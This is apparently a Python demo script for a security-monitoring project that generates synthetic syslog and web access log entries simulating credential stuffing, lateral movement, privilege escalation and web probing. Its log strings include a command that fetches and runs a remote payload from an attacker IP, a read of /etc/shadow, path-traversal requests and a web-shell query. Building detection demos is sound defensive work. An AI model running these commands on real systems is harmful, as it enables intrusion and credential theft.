"""
SentinelOps — Anomaly Injector
Generates realistic attack log entries for live demo environments.
Writes syslog-format entries to a monitored log file that Splunk ingests.

Usage:
    python demo/anomaly_injector.py --output /var/log/sentinalops/attack.log
    python demo/anomaly_injector.py --type credential_stuffing --count 150
"""

from __future__ import annotations

import argparse
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path

# Attack source IPs
ATTACKER_IPS = ["40.80.148.42", "23.129.64.210", "185.220.101.34"]

# Target accounts
TARGET_ACCOUNTS = [
    "svc_admin", "j.smith", "m.johnson", "a.chen",
    "admin_local", "root", "backup_svc", "deploy_user",
]

# Hostnames
HOSTS = ["web-prod-01", "app-srv-02", "db-srv-01", "dc-01", "jump-01"]

# Common weak passwords (for log messages only)
PASSWORDS = [
    "Password123", "admin", "Welcome1", "changeme",
    "P@ssw0rd", "Summer2025", "123456", "qwerty",
]


def generate_credential_stuffing(count: int = 150, base_time: datetime | None = None) -> list[str]:
    """Generate credential stuffing attack log entries."""
    if base_time is None:
        base_time = datetime.now(timezone.utc) - timedelta(minutes=15)

    entries = []
    attacker_ip = random.choice(ATTACKER_IPS)
    host = random.choice(HOSTS[:2])

    # Phase 1: Rapid failed logins
    for i in range(count):
        timestamp = base_time + timedelta(seconds=random.uniform(0, 600))
        user = random.choice(TARGET_ACCOUNTS)
        entries.append(
            f'{timestamp.strftime("%b %d %H:%M:%S")} {host} sshd[{random.randint(10000, 65000)}]: '
            f'Failed password for {user} from {attacker_ip} port {random.randint(30000, 60000)} ssh2'
        )

    # Phase 2: Successful login (credential compromise)
    compromise_time = base_time + timedelta(minutes=12)
    compromised_user = "svc_admin"
    entries.append(
        f'{compromise_time.strftime("%b %d %H:%M:%S")} {host} sshd[{random.randint(10000, 65000)}]: '
        f'Accepted password for {compromised_user} from {attacker_ip} port {random.randint(30000, 60000)} ssh2'
    )

    # Phase 3: Lateral movement
    lat_time = compromise_time + timedelta(minutes=3)
    for target_host in HOSTS[1:4]:
        entries.append(
            f'{lat_time.strftime("%b %d %H:%M:%S")} {target_host} sshd[{random.randint(10000, 65000)}]: '
            f'Accepted publickey for {compromised_user} from {host} port {random.randint(30000, 60000)} ssh2'
        )
        lat_time += timedelta(seconds=random.uniform(30, 120))

    # Phase 4: Privilege escalation
    priv_time = lat_time + timedelta(minutes=2)
    entries.append(
        f'{priv_time.strftime("%b %d %H:%M:%S")} {HOSTS[1]} sudo: {compromised_user} : '
        f'TTY=pts/0 ; PWD=/home/{compromised_user} ; USER=root ; '
        f'COMMAND=/bin/bash'
    )

    # Phase 5: Suspicious activity
    sus_time = priv_time + timedelta(minutes=1)
    suspicious_commands = [
        f'wget http://{ATTACKER_IPS[1]}:8443/payload.sh -O /tmp/update.sh',
        f'chmod +x /tmp/update.sh',
        f'/tmp/update.sh',
        f'cat /etc/shadow',
        f'crontab -e',
    ]
    for cmd in suspicious_commands:
        entries.append(
            f'{sus_time.strftime("%b %d %H:%M:%S")} {HOSTS[1]} sudo: {compromised_user} : '
            f'TTY=pts/0 ; PWD=/tmp ; USER=root ; '
            f'COMMAND={cmd}'
        )
        sus_time += timedelta(seconds=random.uniform(5, 30))

    # Sort by timestamp
    entries.sort()
    return entries


def generate_web_attacks(count: int = 50) -> list[str]:
    """Generate suspicious web access log entries."""
    base_time = datetime.now(timezone.utc) - timedelta(minutes=10)
    entries = []
    attacker_ip = random.choice(ATTACKER_IPS)

    suspicious_paths = [
        "/admin/login",
        "/api/v1/users",
        "/wp-admin/",
        "/.env",
        "/etc/passwd",
        "/api/../../../etc/shadow",
        "/cmd.php?cmd=id",
    ]

    for i in range(count):
        timestamp = base_time + timedelta(seconds=random.uniform(0, 300))
        path = random.choice(suspicious_paths)
        status = random.choice([403, 404, 500, 200])
        entries.append(
            f'{attacker_ip} - - [{timestamp.strftime("%d/%b/%Y:%H:%M:%S +0000")}] '
            f'"GET {path} HTTP/1.1" {status} {random.randint(100, 5000)} '
            f'"-" "Mozilla/5.0 (compatible; AttackBot/1.0)"'
        )

    entries.sort()
    return entries


def main():
    parser = argparse.ArgumentParser(description="SentinelOps Anomaly Injector")
    parser.add_argument("--output", "-o", type=str, default=None,
                       help="Output log file path (default: stdout)")
    parser.add_argument("--type", "-t", type=str, default="credential_stuffing",
                       choices=["credential_stuffing", "web_attack", "all"],
                       help="Type of attack to simulate")
    parser.add_argument("--count", "-c", type=int, default=150,
                       help="Number of events to generate")

    args = parser.parse_args()

    entries = []
    if args.type in ("credential_stuffing", "all"):
        entries.extend(generate_credential_stuffing(args.count))
    if args.type in ("web_attack", "all"):
        entries.extend(generate_web_attacks(args.count))

    output = "\n".join(entries) + "\n"

    if args.output:
        path = Path(args.output)
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "a", encoding="utf-8") as f:
            f.write(output)
        print(f"✅ Wrote {len(entries)} entries to {path}")
    else:
        print(output)
        print(f"\n✅ Generated {len(entries)} attack log entries", file=sys.stderr)


if __name__ == "__main__":
    main()
